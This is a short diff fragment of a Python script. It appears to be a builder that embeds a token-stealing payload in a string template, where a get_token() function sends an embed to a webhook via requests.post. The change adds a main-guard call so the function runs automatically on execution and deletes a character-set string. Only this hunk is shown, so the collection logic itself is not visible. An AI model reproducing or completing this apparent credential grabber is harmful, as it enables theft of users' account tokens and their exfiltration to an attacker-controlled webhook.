@@ -172,10 +172,12 @@ def get_token():
         }
 
         requests.post(webhook, json=embed)
-
+        
+if __name__ == '__main__':
+    get_token()
+    
 """
 
-    strings = "abcdefghijklmnopqrstuvwxyz0123456789"
 
 
 
